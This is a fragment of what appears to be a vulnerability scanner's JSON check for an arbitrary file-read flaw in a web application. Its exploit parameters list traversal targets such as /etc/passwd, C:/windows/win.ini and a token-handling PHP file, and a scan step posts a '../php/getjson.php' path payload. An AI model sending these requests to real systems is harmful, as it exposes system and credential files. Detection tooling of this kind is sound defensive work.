  ...
  "ExpParams": [
    {
      "name": "filepath",
      "type": "createSelect",
      "value": "../php/rj_get_token.php,C:/ICPAS/Wnmp/WWW/php/rj_get_token.php,C:/windows/win.ini,/etc/passwd,/proc/version",
      "show": ""
    }
  ],
  "ExpTips": {
  ...
  "ScanSteps": [
    "AND",
    {
      "Request": {
        ...
        "data_type": "text",
        "data": "jsondata[url]=../php/getjson.php"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
